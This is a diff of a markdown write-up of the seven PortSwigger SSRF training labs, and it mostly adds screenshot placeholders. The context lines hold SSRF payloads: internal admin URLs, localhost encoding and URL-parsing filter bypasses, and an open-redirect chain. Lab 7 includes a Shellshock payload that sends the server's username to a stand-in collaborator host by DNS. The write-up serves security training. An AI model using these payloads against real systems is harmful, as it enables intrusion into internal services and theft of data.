@@ -13,6 +13,9 @@ Server-side request forgery (SSRF) is a vulnerability where an attacker can make
 This post covers all **7 PortSwigger SSRF labs**. Most use the same entry point — a "Check stock" feature that takes a `stockApi` URL and fetches it server-side.
 
 ## Lab 1 — Basic SSRF against the local server
+> **Picture goes here (#1).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `stockApi=http://localhost/admin`.
+> _Save as_ `images/portswigger-ssrf-labs/1.png` _then replace this block with_ `![Lab 1 — Basic SSRF against the local server](/images/portswigger-ssrf-labs/1.png)`_._
+
 
 **Difficulty:** Apprentice
 **Goal:** Reach the admin interface and delete `carlos`.
@@ -29,9 +32,13 @@ The admin panel HTML is returned. Find the delete link and request it:
 stockApi=http://localhost/admin/delete?username=carlos
 ```
 
-> **[Screenshot]** The `stockApi=http://localhost/admin` response rendering the admin panel and the delete request.
+> **Picture goes here (#2).** The `stockApi=http://localhost/admin` response rendering the admin panel and the delete request.
+> _Save as_ `images/portswigger-ssrf-labs/2.png` _then replace this block with_ `![Lab 1 — Basic SSRF against the local server](/images/portswigger-ssrf-labs/2.png)`_._
 
 ## Lab 2 — Basic SSRF against another back-end system
+> **Picture goes here (#3).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `stockApi=http://192.168.0.§1§:8080/admin`.
+> _Save as_ `images/portswigger-ssrf-labs/3.png` _then replace this block with_ `![Lab 2 — Basic SSRF against another back-end system](/images/portswigger-ssrf-labs/3.png)`_._
+
 
 **Difficulty:** Apprentice
 **Goal:** Discover an internal host and use it to delete `carlos`.
@@ -48,9 +55,13 @@ Configure the payload as **Numbers, from 1 to 255, step 1**, and start the attac
 stockApi=http://192.168.0.<IP>:8080/admin/delete?username=carlos
 ```
 
-> **[Screenshot]** Intruder results with a single 200 status revealing the internal admin host.
+> **Picture goes here (#4).** Intruder results with a single 200 status revealing the internal admin host.
+> _Save as_ `images/portswigger-ssrf-labs/4.png` _then replace this block with_ `![Lab 2 — Basic SSRF against another back-end system](/images/portswigger-ssrf-labs/4.png)`_._
 
 ## Lab 3 — SSRF with blacklist-based input filter
+> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `stockApi=http://127.0.0.1/        → blocked`.
+> _Save as_ `images/portswigger-ssrf-labs/5.png` _then replace this block with_ `![Lab 3 — SSRF with blacklist-based input filter](/images/portswigger-ssrf-labs/5.png)`_._
+
 
 **Difficulty:** Practitioner
 **Goal:** Bypass a blacklist blocking `127.0.0.1` and `admin`.
@@ -81,7 +92,13 @@ stockApi=http://127.1/%2561dmin/delete?username=carlos
 
 > **Other localhost equivalents:** `127.1`, `127.0.0.1`, `2130706433` (decimal), `0177.0.0.1`, `0x7f.0.0.1`, `[::1]`.
 
+> **Picture goes here (#6).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/portswigger-ssrf-labs/6.png` _then replace this block with_ `![Lab 3 — SSRF with blacklist-based input filter](/images/portswigger-ssrf-labs/6.png)`_._
+
 ## Lab 4 — SSRF with filter bypass via open redirection
+> **Picture goes here (#7).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin`.
+> _Save as_ `images/portswigger-ssrf-labs/7.png` _then replace this block with_ `![Lab 4 — SSRF with filter bypass via open redirection](/images/portswigger-ssrf-labs/7.png)`_._
+
 
 **Difficulty:** Practitioner
 **Goal:** Bypass a filter that blocks non-whitelisted hosts by chaining an open redirect.
@@ -100,9 +117,13 @@ Then append the delete action:
 stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
 ```
 
-> **[Screenshot]** The redirect-based payload and the admin page returned by the stock checker.
+> **Picture goes here (#8).** The redirect-based payload and the admin page returned by the stock checker.
+> _Save as_ `images/portswigger-ssrf-labs/8.png` _then replace this block with_ `![Lab 4 — SSRF with filter bypass via open redirection](/images/portswigger-ssrf-labs/8.png)`_._
 
 ## Lab 5 — SSRF with whitelist-based input filter
+> **Picture goes here (#9).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `stockApi=http://127.0.0.1/                       → rejected`.
+> _Save as_ `images/portswigger-ssrf-labs/9.png` _then replace this block with_ `![Lab 5 — SSRF with whitelist-based input filter](/images/portswigger-ssrf-labs/9.png)`_._
+
 
 **Difficulty:** Practitioner
 **Goal:** Bypass a hostname whitelist by abusing URL parsing.
@@ -124,9 +145,13 @@ stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=c
 
 The whitelist sees `stock.weliketoshop.net`; the actual connection goes to `localhost:80`.
 
-> **[Screenshot]** The whitelist-bypass payload deleting carlos.
+> **Picture goes here (#10).** The whitelist-bypass payload deleting carlos.
+> _Save as_ `images/portswigger-ssrf-labs/10.png` _then replace this block with_ `![Lab 5 — SSRF with whitelist-based input filter](/images/portswigger-ssrf-labs/10.png)`_._
 
 ## Lab 6 — Blind SSRF with out-of-band detection
+> **Picture goes here (#11).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Referer`.
+> _Save as_ `images/portswigger-ssrf-labs/11.png` _then replace this block with_ `![Lab 6 — Blind SSRF with out-of-band detection](/images/portswigger-ssrf-labs/11.png)`_._
+
 
 **Difficulty:** Practitioner
 **Goal:** Detect a blind SSRF using Burp Collaborator.
@@ -140,7 +165,13 @@ Analytics software fetches the URL in the **`Referer`** header when a product pa
 
 > **Community Edition:** Collaborator requires Burp Pro. Use a self-hosted OAST server such as `interactsh` instead.
 
+> **Picture goes here (#12).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/portswigger-ssrf-labs/12.png` _then replace this block with_ `![Lab 6 — Blind SSRF with out-of-band detection](/images/portswigger-ssrf-labs/12.png)`_._
+
 ## Lab 7 — Blind SSRF with Shellshock exploitation
+> **Picture goes here (#13).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`.
+> _Save as_ `images/portswigger-ssrf-labs/13.png` _then replace this block with_ `![Lab 7 — Blind SSRF with Shellshock exploitation](/images/portswigger-ssrf-labs/13.png)`_._
+
 
 **Difficulty:** Expert
 **Goal:** Chain blind SSRF against an internal Bash CGI server (CVE-2014-6271) to exfiltrate the OS username.
@@ -166,7 +197,8 @@ Referer: http://192.168.0.§1§:8080
 
 6. Run the Intruder attack over `1–255`. When it completes, poll Collaborator: a DNS interaction appears whose subdomain contains the OS username.
 
-> **[Screenshot]** Collaborator DNS interaction with the username in the subdomain.
+> **Picture goes here (#14).** Collaborator DNS interaction with the username in the subdomain.
+> _Save as_ `images/portswigger-ssrf-labs/14.png` _then replace this block with_ `![Lab 7 — Blind SSRF with Shellshock exploitation](/images/portswigger-ssrf-labs/14.png)`_._
 
 ## SSRF cheat sheet
 
